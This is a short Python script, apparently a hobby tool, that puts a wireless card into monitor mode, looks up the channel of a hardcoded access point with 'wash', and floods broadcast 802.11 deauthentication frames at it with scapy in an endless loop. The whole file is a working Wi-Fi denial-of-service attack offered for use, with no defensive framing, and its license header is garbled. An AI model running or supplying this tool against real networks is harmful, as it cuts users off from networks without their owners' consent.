'''
                     GENERAL PUBLIC LICENSE
                     Version 3, 24 jan 2024

 Copyright (C) 2024 Free Everyone is permitted to copy and distribute
 verbatim copies of this license document, but changing it is not allowed.

this tool ws made by sofyane bentaleb for fun 
facebook: https://web.facebook.com/sefyan.yalis
isntagram : https://www.instagram.com/s.f.n_term
github : https://github.com/sefyan0hack
linkedin " https://www.linkedin.com/in/kritos-yt-090a22273/

'''
from scapy.all import *
import json
import time
import subprocess

bssid = 'B0:0A:D5:40:CF:3E'#'BC:2E:F6:60:31:97'
card = "wlan1"
_T = 10
def prepear():
    subprocess.run(['rfkill','unblock','wifi'])
    subprocess.run(['rfkill','unblock','all'])
    subprocess.run(['ifconfig',card,'down'])
    subprocess.run(['iwconfig',card,'mode','monitor'])
    subprocess.run(['ifconfig',card,'up'])
def dumpdata():
    strdata = subprocess.run(['timeout','20','wash','-i',card,'-j','-a'],stdout=subprocess.PIPE).stdout.decode()
    json_objects = strdata.strip().split('\n')
    return json_objects

def Channel(json_objects):
    channel = 0
    for json_obj in json_objects:
        obj = json.loads(json_obj)
        if obj.get("bssid") == bssid:
            channel = obj.get("channel")
            break
    return channel

def Essid(json_objects):
    essid = 'Essid'
    for json_obj in json_objects:
        obj = json.loads(json_obj)
        if obj.get("bssid") == bssid:
            essid = obj.get("essid")
            break
    return essid
def deauth():
    radiotap = RadioTap(
    version=0,
    pad=0,
    len=13,
    present="Rate+TXFlags+b18",
    Rate=1.0,  # Mbps
    TXFlags="",
    notdecoded="\x00"
)

    dot11 = Dot11(
        subtype=0xC,
        type=0,
        proto=0,
        FCfield="",
        ID=14849,
        addr1="ff:ff:ff:ff:ff:ff", 
        addr2=bssid,  
        addr3=bssid,  
        SC=13568
)
    deauth = Dot11Deauth(reason=7)  # class3-from-nonass

# Combine the layers
    packet = radiotap / dot11 / deauth
    sendp(packet,count=_T*1000,iface=card, verbose=False)
def main():
    prepear()
    while True:
        data = dumpdata()
        print(f'Wireless: {Essid(data)} Channel: {Channel(data)} MAC: {bssid}')
        subprocess.run(['iwconfig',card,'channel',f'{Channel(data)}'])
        deauth()
        time.sleep(_T)
        print("------------------------------------------------------------------------")

if __name__ == "__main__":
    main()
